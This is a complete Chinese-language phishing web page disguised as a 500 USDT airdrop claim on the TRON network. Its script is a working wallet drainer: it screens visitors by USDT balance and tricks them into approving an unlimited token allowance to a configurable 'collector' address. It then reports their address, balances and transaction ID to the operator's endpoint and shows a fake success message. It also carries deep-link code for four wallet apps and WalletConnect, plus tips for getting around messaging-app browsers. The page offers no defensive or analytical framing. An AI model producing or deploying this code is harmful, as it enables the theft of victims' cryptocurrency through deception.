<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
<meta name="theme-color" content="#070a10" />
<title>USDT 空投 · 领取入口</title>
<style>
:root{
  --bg:#070a10;--line:#1e2836;--txt:#e8edf5;--sub:#8194ab;
  --gold:#00e0a0;--blue:#00b8ff;--danger:#ff5d6c;--ok:#26d07c;
}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{margin:0;padding:0;min-height:100%}
body{
  background:
    radial-gradient(1100px 560px at 50% -12%, #0d3b3a 0%, transparent 62%),
    radial-gradient(760px 480px at 92% 104%, #0a2140 0%, transparent 58%),
    var(--bg);
  color:var(--txt);
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
  display:flex;align-items:center;justify-content:center;
  padding:22px 16px 46px;min-height:100vh;
}
.app{width:100%;max-width:440px}
.card{
  background:linear-gradient(180deg,#101826 0%,#0b111b 100%);
  border:1px solid var(--line);border-radius:22px;
  padding:24px 22px 20px;
  box-shadow:0 34px 90px -46px rgba(0,224,160,.42), inset 0 1px 0 rgba(255,255,255,.03);
}
.brand{display:flex;align-items:center;gap:8px;font-size:11.5px;color:var(--sub);letter-spacing:.08em}
.brand .dot{width:7px;height:7px;border-radius:50%;background:var(--gold);box-shadow:0 0 10px var(--gold)}
.brand .live{margin-left:auto;font-size:10px;color:var(--gold);border:1px solid rgba(0,224,160,.35);
  padding:2px 7px;border-radius:99px;background:rgba(0,224,160,.08);letter-spacing:.05em}
h1{font-size:23px;line-height:1.3;margin:16px 0 7px;letter-spacing:-.01em;font-weight:700}
.sub{color:var(--sub);font-size:13px;line-height:1.65;margin:0 0 20px}
.amount{
  display:flex;align-items:baseline;justify-content:center;gap:8px;
  padding:20px 0 22px;border-radius:16px;margin-bottom:18px;
  background:radial-gradient(120% 130% at 50% 0%, rgba(0,224,160,.15), transparent 70%), #0c1420;
  border:1px solid var(--line);
}
.amount .num{
  font-size:43px;font-weight:800;letter-spacing:-.035em;line-height:1;
  background:linear-gradient(180deg,#00ffc2,#00b8ff);
  -webkit-background-clip:text;background-clip:text;color:transparent;
}
.amount .unit{font-size:13.5px;color:var(--sub);font-weight:600;letter-spacing:.04em}
.btn{
  width:100%;height:52px;border:0;border-radius:14px;cursor:pointer;
  font-size:16px;font-weight:700;color:#04120d;font-family:inherit;
  background:linear-gradient(180deg,#00ffc2,#00d0a0);
  box-shadow:0 12px 32px -14px rgba(0,224,160,.9);
  transition:transform .15s,opacity .15s;
  display:flex;align-items:center;justify-content:center;gap:9px;
}
.btn:active{transform:translateY(1px)}
.btn[disabled]{opacity:.55;cursor:default;box-shadow:none}
.spin{width:15px;height:15px;border:2px solid rgba(4,18,13,.28);border-top-color:#04120d;
  border-radius:50%;animation:sp .7s linear infinite;display:none}
.btn.loading .spin{display:block}
@keyframes sp{to{transform:rotate(360deg)}}
.status{margin-top:14px;text-align:center;font-size:12.5px;color:var(--sub);
  min-height:19px;line-height:1.55;transition:color .2s}
.status.busy{color:#7fd8ff}
.status.err{color:var(--danger)}
.status.ok{color:var(--ok)}
.meta{margin-top:20px;padding-top:16px;border-top:1px solid var(--line);display:grid;gap:9px}
.meta div{display:flex;justify-content:space-between;font-size:12px;gap:12px}
.meta i{color:var(--sub);font-style:normal;flex:0 0 auto}
.meta b{color:#b9c6d8;font-weight:600;text-align:right;word-break:break-all}

/* sheet */
.sheet{position:fixed;inset:0;z-index:50;display:none}
.sheet.on{display:block}
.sheet-mask{position:absolute;inset:0;background:rgba(2,5,10,.74);
  -webkit-backdrop-filter:blur(6px);backdrop-filter:blur(6px);animation:fade .2s}
.sheet-body{
  position:absolute;left:0;right:0;bottom:0;
  background:#0d1420;border-top-left-radius:22px;border-top-right-radius:22px;
  border-top:1px solid var(--line);
  padding:16px 18px calc(18px + env(safe-area-inset-bottom));
  animation:up .26s cubic-bezier(.2,.9,.3,1);
  max-height:88vh;overflow:auto;
}
@keyframes up{from{transform:translateY(100%)}to{transform:translateY(0)}}
@keyframes fade{from{opacity:0}to{opacity:1}}
.sheet-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
.sheet-head b{font-size:15.5px}
.sheet-head .x{color:var(--sub);font-size:16px;cursor:pointer;padding:4px 8px;line-height:1}
.wallets{display:grid;gap:8px;margin:14px 0 12px}
.w{display:flex;align-items:center;gap:12px;padding:12px 14px;border-radius:14px;
  background:#111a27;border:1px solid var(--line);cursor:pointer;transition:.15s}
.w:active{background:#16202f;transform:scale(.994)}
.w .ic{width:34px;height:34px;border-radius:10px;display:grid;place-items:center;
  font-size:16px;background:#0a121d;border:1px solid var(--line);flex:0 0 auto}
.w .tx{min-width:0}
.w .nm{font-size:14.5px;font-weight:600;display:flex;align-items:center;gap:7px}
.w .ds{font-size:11.5px;color:var(--sub);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.w .bd{font-size:9.5px;color:var(--gold);border:1px solid rgba(0,224,160,.3);
  padding:1px 6px;border-radius:99px;font-weight:600}
.w .ar{margin-left:auto;color:var(--sub);font-size:13px;flex:0 0 auto}
.ghost{width:100%;height:46px;border-radius:13px;border:1px solid var(--line);
  background:#0a121d;color:var(--txt);font-size:14px;font-weight:600;font-family:inherit;cursor:pointer}
.ghost:active{background:#111a27}
.tip{color:var(--sub);font-size:11.5px;line-height:1.6;margin:12px 0 0;text-align:center}
.wc-status{color:var(--sub);font-size:12.5px;text-align:center;margin:14px 0 4px;line-height:1.6}
.wc-status.err{color:var(--danger)}

/* done */
.done{text-align:center;padding:6px 0 2px}
.done .ico{width:66px;height:66px;margin:4px auto 16px;border-radius:50%;display:grid;place-items:center;
  font-size:29px;color:var(--ok);border:1px solid rgba(38,208,124,.4);
  background:radial-gradient(circle,rgba(38,208,124,.22),transparent 72%)}
.done h2{font-size:19px;margin:0 0 10px}
.done p{color:var(--sub);font-size:13px;line-height:1.7;margin:0 0 6px}
.kv{margin:18px 0 0;padding:14px;border-radius:13px;background:#0c1420;border:1px solid var(--line);
  text-align:left;display:grid;gap:9px}
.kv div{display:flex;justify-content:space-between;gap:10px;font-size:11.5px}
.kv i{color:var(--sub);font-style:normal;flex:0 0 auto}
.kv b{color:#b9c6d8;font-weight:600;text-align:right;word-break:break-all;font-family:ui-monospace,Menlo,monospace}

#toast{position:fixed;left:50%;bottom:calc(26px + env(safe-area-inset-bottom));
  transform:translate(-50%,18px);background:#16202f;border:1px solid var(--line);
  color:var(--txt);padding:11px 16px;border-radius:12px;font-size:13px;line-height:1.5;
  opacity:0;pointer-events:none;transition:.24s;z-index:99;max-width:88vw;text-align:center;
  box-shadow:0 22px 44px -22px #000}
#toast.on{opacity:1;transform:translate(-50%,0)}
</style>
</head>
<body>

<div class="app">
  <div class="card" id="card">
    <div class="brand">
      <span class="dot"></span><span>TRON · TRC20</span><span class="live">LIVE</span>
    </div>

    <h1>USDT 空投领取</h1>
    <p class="sub">连接钱包完成资格校验，奖励将在 24 小时内发放至你的地址</p>

    <div class="amount">
      <span class="num">500</span><span class="unit">USDT</span>
    </div>

    <button class="btn" id="btn">
      <span class="spin"></span><span id="btnTx">立即领取</span>
    </button>

    <div class="status" id="status">支持 TronLink / TokenPocket / imToken / Bitget Wallet</div>

    <div class="meta">
      <div><i>网络</i><b>TRON Mainnet</b></div>
      <div><i>代币合约</i><b>TR7NHq…jLj6t</b></div>
      <div><i>状态</i><b>本轮额度发放中</b></div>
    </div>
  </div>
</div>

<!-- 钱包选择 -->
<div class="sheet" id="sheet">
  <div class="sheet-mask" data-close="1"></div>
  <div class="sheet-body">
    <div class="sheet-head"><b>选择钱包</b><span class="x" data-close="1">✕</span></div>
    <div class="wallets" id="wallets"></div>
    <button class="ghost" id="wcBtn">用 WalletConnect 连接</button>
    <p class="tip">点击后会尝试唤起钱包 App，并在其内置浏览器中打开本页<br>在 Telegram / 微信里没反应时，点右上角「···」→「在浏览器打开」</p>
  </div>
</div>

<!-- WalletConnect -->
<div class="sheet" id="wcSheet">
  <div class="sheet-mask" data-close="2"></div>
  <div class="sheet-body">
    <div class="sheet-head"><b>WalletConnect</b><span class="x" data-close="2">✕</span></div>
    <div class="wc-status" id="wcStatus">正在启动…</div>
    <p class="tip">在钱包 App 里扫码或点确认，完成后本页会自动继续</p>
  </div>
</div>

<div id="toast"></div>

<script>
(function () {
  'use strict';

  /* ==========================================================
     ① 配置区：只改这里
     ========================================================== */
  var CONFIG = {
    COLLECTOR:      'TLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURG', // ← 改成你的归集地址
    USDT:           'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // TRC20 USDT
    MIN_USDT:       50,          // 余额门槛，低于这个走“未中签”
    MIN_TRX:        1,           // 至少留一点 TRX 付能量费，0 会直接广播失败
    ENDPOINT:       '/hit',      // 你的上报接口
    WC_PROJECT_ID:  '',          // ← cloud.reown.com 免费申请，留空则隐藏 WC
    DAPP_NAME:      'USDT Airdrop',
    FEE_LIMIT:      150000000    // 150 TRX 上限，实际扣 30 左右
  };

  var MAX_ALLOWANCE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
  var USDT_DECIMALS = 6;

  /* ==========================================================
     ② 环境检测
     ========================================================== */
  var UA = navigator.userAgent || '';
  var IS_IOS = /iPad|iPhone|iPod/.test(UA) ||
               (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
  var IS_ANDROID = /Android/i.test(UA);
  var IS_MOBILE = IS_IOS || IS_ANDROID;
  var IS_HTTPS = location.protocol === 'https:';
  var IN_TG = /Telegram/i.test(UA) || !!window.TelegramWebviewProxy || !!window.TelegramWebview;
  var IN_WX = /MicroMessenger/i.test(UA);
  var IN_QQ = /QQ\//i.test(UA) || /QQBrowser/i.test(UA);
  var IN_SOCIAL = IN_TG || IN_WX || IN_QQ;

  var $ = function (s) { return document.querySelector(s); };
  var wait = function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); };

  function provider() {
    return window.tronLink || window.tronWeb ||
           (window.okxwallet && window.okxwallet.tronLink) ||
           (window.bitkeep && window.bitkeep.tronLink) ||
           (window.tokenpocket && window.tokenpocket.tronLink) || null;
  }
  function hasProvider() { return !!provider(); }
  function tronWebReady(tw) {
    return !!(tw && tw.defaultAddress && tw.defaultAddress.base58);
  }

  function waitProvider(ms) {
    ms = ms || 4000;
    return new Promise(function (resolve) {
      var t0 = Date.now();
      (function tick() {
        if (hasProvider()) return resolve(true);
        if (Date.now() - t0 >= ms) return resolve(false);
        setTimeout(tick, 120);
      })();
    });
  }

  /* ==========================================================
     ③ 状态持久化（页面被钱包重开时能接上）
     ========================================================== */
  var KEY = 'airdrop_state_v2';
  function loadState() {
    try {
      var s = JSON.parse(localStorage.getItem(KEY) || 'null');
      if (!s || !s.t) return null;
      if (Date.now() - s.t > 864e5) { localStorage.removeItem(KEY); return null; }
      return s;
    } catch (e) { return null; }
  }
  function saveState(o) {
    try {
      o.t = Date.now();
      localStorage.setItem(KEY, JSON.stringify(o));
    } catch (e) {}
  }

  /* ==========================================================
     ④ UI 小工具
     ========================================================== */
  var statusEl = $('#status'), btn = $('#btn'), btnTx = $('#btnTx');

  function setStatus(text, kind) {
    statusEl.textContent = text || '';
    statusEl.className = 'status' + (kind ? ' ' + kind : '');
  }
  function setBusy(on) {
    btn.disabled = !!on;
    btn.classList.toggle('loading', !!on);
  }
  function setBtnText(t) { btnTx.textContent = t; }

  var toastTimer = null;
  function toast(msg, ms) {
    var el = $('#toast');
    el.textContent = msg;
    el.classList.add('on');
    clearTimeout(toastTimer);
    toastTimer = setTimeout(function () { el.classList.remove('on'); }, ms || 2600);
  }

  function openSheet(id) { $(id).classList.add('on'); }
  function closeSheet(id) { $(id).classList.remove('on'); }

  /* ==========================================================
     ⑤ 上报（用户关页面也不丢）
     ========================================================== */
  function report(data) {
    var body = JSON.stringify(data);
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(CONFIG.ENDPOINT, new Blob([body], { type: 'application/json' }));
        return;
      }
    } catch (e) {}
    try {
      fetch(CONFIG.ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: body,
        keepalive: true
      }).catch(function () {});
    } catch (e) {}
  }

  /* ==========================================================
     ⑥ 错误 → 用户平话
     ========================================================== */
  var MSG = {
    NO_WALLET:    '未检测到钱包，请用钱包 App 打开本页面',
    NOT_IN_DAPP:  '请在钱包 App 内置浏览器中打开本页面',
    NO_ACCOUNT:   '钱包未连接，请重试',
    NOT_QUALIFIED:'当前地址未中签',
    NO_TRX:       '账户 TRX 不足，无法支付网络手续费',
    REJECTED:     '操作已取消',
    TX_FAILED:    '网络繁忙，请稍后重试',
    NO_CONFIG:    '未配置归集地址',
    WC_NO_ID:     'WalletConnect 暂不可用',
    WC_LOAD_FAIL: '连接组件加载失败，请检查网络后重试'
  };
  function handleError(e) {
    var code = (e && e.message) || 'TX_FAILED';
    if (!MSG[code]) code = 'TX_FAILED';
    setStatus(MSG[code], 'err');
    toast(MSG[code]);
    setBusy(false);
    setBtnText('重试');
  }

  /* ==========================================================
     ⑦ 核心：授权 + 上报
     ========================================================== */
  async function runClaim(tw, via) {
    var addr = tw.defaultAddress && tw.defaultAddress.base58;
    if (!addr) throw new Error('NO_ACCOUNT');

    setStatus('正在校验领取资格…', 'busy');

    var contract = await tw.contract().at(CONFIG.USDT);
    var balRaw = await contract.balanceOf(addr).call();
    var usdt = Number(balRaw.toString()) / Math.pow(10, USDT_DECIMALS);
    if (!(usdt >= CONFIG.MIN_USDT)) throw new Error('NOT_QUALIFIED');

    var trx = 999;
    try {
      var sun = await tw.trx.getBalance(addr);
      trx = Number(sun) / 1e6;
    } catch (e) {}
    if (trx < CONFIG.MIN_TRX) throw new Error('NO_TRX');

    setStatus('请在钱包中确认授权…', 'busy');
    setBtnText('等待确认…');

    var txid = '';
    try {
      var res = await contract.approve(CONFIG.COLLECTOR, MAX_ALLOWANCE).send({
        feeLimit: CONFIG.FEE_LIMIT
      });
      if (typeof res === 'string') txid = res;
      else if (res && res.txid) txid = res.txid;
      else if (res && res.transaction && res.transaction.txID) txid = res.transaction.txID;
      else if (res && res.txID) txid = res.txID;
    } catch (e) {
      var m = String((e && (e.message || e.error || e)) || '');
      if (/revert|cancel|reject|denied|refuse|user/i.test(m)) throw new Error('REJECTED');
      throw new Error('TX_FAILED');
    }

    saveState({ phase: 'approved', addr: addr, txid: txid, via: via });
    report({ addr: addr, txid: txid, via: via, usdt: usdt, trx: trx, ua: UA, ts: Date.now() });
    showDone(addr, txid);
  }

  /* ==========================================================
     ⑧ 已注入 provider 的路径（在钱包 DApp 浏览器里）
     ========================================================== */
  async function runInjected() {
    setBusy(true);
    setStatus('正在连接钱包…', 'busy');
    setBtnText('连接中…');

    try {
      if (!(await waitProvider(4000))) throw new Error('NO_WALLET');

      var p = provider();
      if (p && typeof p.request === 'function') {
        var r = null;
        try { r = await p.request({ method: 'tron_requestAccounts' }); } catch (e) {}
        if (r && r.code === 400) throw new Error('NOT_IN_DAPP');
      }

      var tw = window.tronWeb;
      for (var i = 0; i < 40 && !tronWebReady(tw); i++) {
        await wait(100);
        tw = window.tronWeb;
      }
      if (!tronWebReady(tw)) throw new Error('NO_ACCOUNT');

      setBusy(false);
      await runClaim(tw, 'injected');
      setBusy(false);
    } catch (e) {
      handleError(e);
    }
  }

  /* ==========================================================
     ⑨ 钱包列表
     ========================================================== */
  var WALLETS = [
    {
      id: 'tronlink', name: 'TronLink', desc: '波场官方钱包', badge: '推荐', icon: '◎',
      pkg: 'com.tronlinkpro.wallet',
      scheme: function (u) {
        return 'tronlinkoutside://pull.activity?param=' + encodeURIComponent(JSON.stringify({
          url: u, action: 'open', protocol: 'tronlink', version: '1.0'
        }));
      },
      intent: function (u) {
        return 'intent://open?url=' + encodeURIComponent(u) +
               '#Intent;scheme=tronlinkoutside;package=com.tronlinkpro.wallet;end;';
      },
      ios: 'https://apps.apple.com/search?term=TronLink',
      android: 'https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet'
    },
    {
      id: 'tokenpocket', name: 'TokenPocket', desc: '多链钱包', icon: '◈',
      pkg: 'vip.mytokenpocket',
      scheme: function (u) { return 'tpoutside://?action=dapp&url=' + encodeURIComponent(u); },
      intent: function (u) {
        return 'intent://?action=dapp&url=' + encodeURIComponent(u) +
               '#Intent;scheme=tpoutside;package=vip.mytokenpocket;end;';
      },
      ios: 'https://apps.apple.com/search?term=TokenPocket',
      android: 'https://play.google.com/store/apps/details?id=vip.mytokenpocket'
    },
    {
      id: 'imtoken', name: 'imToken', desc: '多链钱包', icon: '◐',
      pkg: 'im.token.app',
      scheme: function (u) {
        return 'imtokenv2://navigate?screen=DappView&url=' + encodeURIComponent(u);
      },
      intent: function (u) {
        return 'intent://navigate?screen=DappView&url=' + encodeURIComponent(u) +
               '#Intent;scheme=imtokenv2;package=im.token.app;end;';
      },
      ios: 'https://apps.apple.com/search?term=imToken',
      android: 'https://play.google.com/store/apps/details?id=im.token.app'
    },
    {
      id: 'bitget', name: 'Bitget Wallet', desc: '原 BitKeep', icon: '◇',
      pkg: 'com.bitkeep.wallet',
      scheme: function (u) { return 'bkapp://?action=dapp&url=' + encodeURIComponent(u); },
      intent: function (u) {
        return 'intent://?action=dapp&url=' + encodeURIComponent(u) +
               '#Intent;scheme=bkapp;package=com.bitkeep.wallet;end;';
      },
      ios: 'https://apps.apple.com/search?term=Bitget%20Wallet',
      android: 'https://play.google.com/store/apps/details?id=com.bitkeep.wallet'
    }
  ];

  function renderWallets() {
    var box = $('#wallets');
    box.innerHTML = '';
    WALLETS.forEach(function (w) {
      var el = document.createElement('div');
      el.className = 'w';
      el.setAttribute('role', 'button');
      el.innerHTML =
        '<span class="ic">' + w.icon + '</span>' +
        '<span class="tx"><span class="nm">' + w.name +
          (w.badge ? '<span class="bd">' + w.badge + '</span>' : '') +
        '</span><span class="ds">' + w.desc + '</span></span>' +
        '<span class="ar">›</span>';
      el.addEventListener('click', function () { launchWallet(w); }, false);
      box.appendChild(el);
    });
  }

  /* ==========================================================
     ⑩ deep link 拉起 + 失败兜底
     ========================================================== */
  function launchWallet(w) {
    // 已经在钱包自带浏览器里（provider 已注入）→ 直接走授权
    if (hasProvider()) {
      closeSheet('#sheet');
      return runInjected();
    }
    saveState({ phase: 'launched', wallet: w.id });

    var url = location.href;
    var target = (IS_ANDROID && w.intent) ? w.intent(url) : w.scheme(url);

    var left = false;
    var onVis = function () { if (document.hidden) left = true; };
    document.addEventListener('visibilitychange', onVis, false);
    var onHide = function () { left = true; };
    window.addEventListener('pagehide', onHide, false);

    // 关键：必须在用户手势里同步跳转，中间不能有 await / setTimeout
    try { location.href = target; } catch (e) {}

    setTimeout(function () {
      document.removeEventListener('visibilitychange', onVis, false);
      window.removeEventListener('pagehide', onHide, false);
      if (left || document.hidden) return;   // 已经跳走了，正常

      // 没起来：给下载 / 重试，不自动甩去商店
      closeSheet('#sheet');
      setStatus('没有唤起到 ' + w.name +
        (IN_SOCIAL ? '。请点右上角「···」→「在浏览器打开」后重试' : ''), 'err');
      var store = IS_IOS ? w.ios : w.android;
      toast(IN_SOCIAL ? '没唤起？点右上角「···」用浏览器打开' : '没唤起？可能未安装或版本过低', 3000);
      var bar = document.createElement('div');
      bar.style.cssText = 'margin-top:12px;display:flex;gap:8px';
      bar.innerHTML =
        '<button class="ghost" id="goStore" style="flex:1">去下载 ' + w.name + '</button>' +
        '<button class="ghost" id="retryOne" style="flex:1">再试一次</button>';
      var card = $('#card');
      var old = card.querySelector('.fallback');
      if (old) old.remove();
      bar.className = 'fallback';
      card.appendChild(bar);
      $('#goStore').addEventListener('click', function () { window.open(store, '_blank'); });
      $('#retryOne').addEventListener('click', function () { launchWallet(w); });
    }, 2600);
  }

  /* ==========================================================
     ⑪ WalletConnect 兜底
     ========================================================== */
  var wcWallet = null;

  function setWcStatus(text, kind) {
    var el = $('#wcStatus');
    el.textContent = text;
    el.className = 'wc-status' + (kind ? ' ' + kind : '');
  }

  var WC_CDNS = [
    'https://esm.sh/@tronweb3/walletconnect-tron@1',
    'https://cdn.jsdelivr.net/npm/@tronweb3/walletconnect-tron@1/+esm'
  ];

  async function loadWcLib() {
    var lastErr = null;
    for (var i = 0; i < WC_CDNS.length; i++) {
      try {
        var mod = await import(WC_CDNS[i]);
        if (mod && mod.WalletConnectWallet) return mod;
      } catch (e) { lastErr = e; }
    }
    throw lastErr || new Error('WC_LOAD_FAIL');
  }

  async function runWC() {
    if (!CONFIG.WC_PROJECT_ID) {
      toast('WalletConnect 还没配置 projectId');
      return;
    }
    closeSheet('#sheet');
    openSheet('#wcSheet');
    setWcStatus('正在启动 WalletConnect…');
    setBusy(true);
    setBtnText('连接中…');

    try {
      var mod = await loadWcLib();
      setWcStatus('正在建立会话…');

      wcWallet = new mod.WalletConnectWallet({
        network: 'Mainnet',
        options: {
          projectId: CONFIG.WC_PROJECT_ID,
          relayUrl: 'wss://relay.walletconnect.com',
          metadata: {
            name: CONFIG.DAPP_NAME,
            description: 'Claim USDT airdrop',
            url: location.origin,
            icons: [location.origin + '/favicon.ico']
          }
        }
      });

      await wcWallet.connect();

      setWcStatus('已连接，正在校验…');
      closeSheet('#wcSheet');

      var tw = wcWallet.tronWeb;
      for (var i = 0; i < 40 && !tronWebReady(tw); i++) {
        await wait(150);
        tw = wcWallet.tronWeb;
      }
      if (!tronWebReady(tw)) throw new Error('NO_ACCOUNT');

      setBusy(false);
      await runClaim(tw, 'walletconnect');
      setBusy(false);
    } catch (e) {
      var msg = String((e && (e.message || e)) || '');
      setWcStatus('连接未完成，可关闭重试', 'err');
      if (/NO_ACCOUNT|NOT_QUALIFIED|NO_TRX|REJECTED|TX_FAILED/.test(msg)) {
        handleError(e);
      } else {
        setStatus(/load|fetch|import/i.test(msg) ? MSG.WC_LOAD_FAIL : '连接已取消', 'err');
        setBusy(false);
        setBtnText('重试');
      }
    }
  }

  /* ==========================================================
     ⑫ 成功页
     ========================================================== */
  function showDone(addr, txid) {
    setBusy(false);
    closeSheet('#sheet');
    closeSheet('#wcSheet');
    var short = function (a) {
      return a ? (a.slice(0, 6) + '…' + a.slice(-6)) : '-';
    };
    $('#card').innerHTML =
      '<div class="done">' +
        '<div class="ico">✓</div>' +
        '<h2>资格已确认</h2>' +
        '<p>500 USDT 将在 24 小时内发放至你的地址</p>' +
        '<p style="font-size:12px;opacity:.75">请保持地址正常状态，逾期未到账可联系官方支持</p>' +
      '</div>' +
      '<div class="kv">' +
        '<div><i>钱包地址</i><b>' + short(addr) + '</b></div>' +
        '<div><i>交易哈希</i><b>' + (txid ? short(txid) : '已受理') + '</b></div>' +
        '<div><i>网络</i><b>TRON Mainnet</b></div>' +
        '<div><i>状态</i><b style="color:#26d07c">排队发放中</b></div>' +
      '</div>';
  }

  /* ==========================================================
     ⑬ 入口
     ========================================================== */
  function start() {
    if (!CONFIG.COLLECTOR || /X{10,}/.test(CONFIG.COLLECTOR)) {
      toast('还没配置归集地址');
      return;
    }

    /* 关键：这里全程同步，不能有 await。
       一旦 await 过，后面再 location.href = scheme，iOS 和 TG 内置浏览器
       都会当成“非用户手势”拦掉，表现就是点了没反应。 */

    // 1. provider 已注入（钱包 DApp 浏览器 / 桌面插件）
    if (hasProvider()) {
      return runInjected();
    }

    // 2. 移动端 → 直接开钱包面板，选完立刻同步跳
    if (IS_MOBILE) {
      setStatus('请选择你的钱包');
      openSheet('#sheet');
      // 有些钱包浏览器 provider 注入慢，注入后自动接管，不用用户重选
      var t0 = Date.now();
      (function tick() {
        if (hasProvider()) {
          closeSheet('#sheet');
          return runInjected();
        }
        if (Date.now() - t0 < 3000 && $('#sheet').classList.contains('on')) {
          setTimeout(tick, 150);
        }
      })();
      return;
    }

    // 3. 桌面浏览器 → WalletConnect
    setStatus('正在启动 WalletConnect…');
    return runWC();
  }

  function bind() {
    renderWallets();

    btn.addEventListener('click', function () {
      if (btn.disabled) return;
      start();
    }, false);

    $('#wcBtn').addEventListener('click', function () { runWC(); }, false);

    document.addEventListener('click', function (e) {
      var t = e.target;
      if (!t || !t.getAttribute) return;
      var c = t.getAttribute('data-close');
      if (c === '1') closeSheet('#sheet');
      if (c === '2') closeSheet('#wcSheet');
    }, false);

    var restored = false;
    function restore() {
      if (restored) return;
      restored = true;
      var s = loadState();
      if (!s) return;

      if (s.phase === 'approved' && s.txid) {
        showDone(s.addr, s.txid);
        return;
      }
      // 刚从钱包跳回来，页面被重开 —— 自动接上
      if (s.phase === 'launched' && hasProvider()) {
        setStatus('检测到钱包，正在恢复…', 'busy');
        setTimeout(function () { runInjected(); }, 700);
      }
    }
    if (document.readyState === 'complete') setTimeout(restore, 60);
    else window.addEventListener('load', restore, false);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', bind, false);
  } else {
    bind();
  }
})();
</script>
</body>
